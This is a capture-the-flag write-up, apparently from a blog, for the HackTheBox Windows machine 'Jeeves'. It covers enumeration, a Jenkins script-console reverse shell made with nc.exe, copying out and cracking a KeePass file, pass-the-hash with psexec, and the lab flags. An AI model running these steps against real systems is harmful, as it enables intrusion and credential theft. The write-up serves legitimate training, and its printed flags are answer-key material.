---
title: "Jeeves"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Jeeves

![](../assets/Pasted%20image%2020250613001628.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.63
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 00:16 CEST
Nmap scan report for 10.10.10.63
Host is up (0.041s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-06-13T03:17:32
|_  start_date: 2025-06-13T03:16:20
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.72 ms 10.10.14.1
2   40.82 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.63 seconds
```

Website is about a web searcher

![](../assets/Pasted%20image%2020250613002040.png)

Upon searching, it shows an error image.

![](../assets/Pasted%20image%2020250613002156.png)

Port `50000` shows an error and the Jetty version.

![](../assets/Pasted%20image%2020250613003426.png)

Using `feroxbuster`, we find `/askjeeves`.

![](../assets/Pasted%20image%2020250613003522.png)

`/askjeeves` is a Jenkins instance `2.87`.

![](../assets/Pasted%20image%2020250613003625.png)

## Initial Access

We can go to the script console.

![](../assets/Pasted%20image%2020250613010454.png)

The easiest way is to put a base64-encoded PowerShell reverse shell.

Or we can also get `nc.exe` from an SMB share and connect back to a port.

```shell
println "\\\\10.10.14.17\\kali\\nc.exe -e cmd 10.10.14.17 443".execute().text
```

Either way,

```shell
$ sudo rlwrap nc -lnvp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.63] 49678
whoami
jeeves\kohsuke
```

Get the flag:

```shell
PS C:\users\kohsuke\desktop> type user.txt
e3232272596fb47950d59c4cf1e7066a
```

## Privilege Escalation

There is a KeePass file inside `documents`.

```shell
PS C:\users\kohsuke\documents> ls


    Directory: C:\users\kohsuke\documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  
```

Start an `impacket-smbserver` and copy the file.

```shell
PS C:\users\kohsuke\documents> cp CEH.kdbx \\10.10.14.17\kali
```

With `keepass2john`, get the hash and then with `john` crack it.

```shell
$ keepass2john CEH.kdbx > hash             

$ cat hash      
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

![](../assets/Pasted%20image%2020250613011514.png)

Open the file with `keepassxc` or `kpcli`.

![](../assets/Pasted%20image%2020250613011759.png)

Get the NTLM hash of backup stuff and pass the hash to enter.

```shell
$ impacket-psexec administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file eXJgnHqs.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service BUPi on 10.10.10.63.....
[*] Starting service BUPi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Post Exploitation

Get the flag:

```shell
c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

We need to `dir` with alternative data streams using `/R`.

```shell
C:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,640,015,360 bytes free

C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```
